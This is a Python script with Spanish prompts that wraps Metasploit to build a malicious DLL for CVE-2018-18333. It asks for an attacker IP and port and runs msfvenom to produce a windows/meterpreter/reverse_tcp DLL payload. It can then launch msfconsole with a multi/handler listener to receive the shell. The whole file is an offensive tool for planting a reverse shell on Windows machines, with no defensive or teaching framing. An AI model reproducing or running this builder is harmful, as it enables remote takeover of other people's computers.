#!/usr/bin/python
# _*_ coding: utf8 _*_
import os
W = '\033[37m'
R = '\033[0;31m'  # red
G = '\033[0;32m'  # green
O = '\033[0;33m'  # orange
B = '\033[0;34m'  # blue
P = '\033[0;35m'  # purple
C = '\033[0;36m'  # cyan
GR = '\033[0;37m'  # gray

####################################################
## MSFVENOM GEN DLL METERPRETER  - CVE-2018-18333 ##
####################################################

def banner():
	print(G+"""

.----. .----.    .----. .-.   .-.   
| []  \| []  }   | []  \| |   | |   
|     /| .-. \   |     /| `--.| `--.
`----' `-' `-'   `----' `----'`----' v1.0.2 (Demo Simple)
                                              By Mrx04Programmer
""")

ip = input(C+"IP LOCAL >> "+W)
port = input(C+"PUERTO LOCAL >> "+W)
file = input(C+"NOMBRE DE ARCHIVO(Ex: Systems) >> "+W)
filename = file+".dll"
os.system("clear")
banner()
print(G+"[X] "+W+"Ip establecida como "+G+ip+W+".")
print(G+"[X] "+W+"Puerto establecido como "+G+port+W+".")
print(O+"[X] "+W+"Generando dll malicioso...")
msf = os.system("sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f dll > "+filename)
if msf == 0:
	print(B+"[*] "+W+"Archivo DLL generado exitamente ("+G+filename+W+").")
	desea = input("Desea iniciar metasploit?[S/n]")
	if desea == "S" or desea == "s":
		os.system("sudo msfconsole -x 'use exploit/multi/handler'")
	if desea == "N" or desea == "n":
		exit()
else:
	print(R+"[-] "+W+"No se pudo generar el archivo exitosamente, instale corectamente metasploit..")
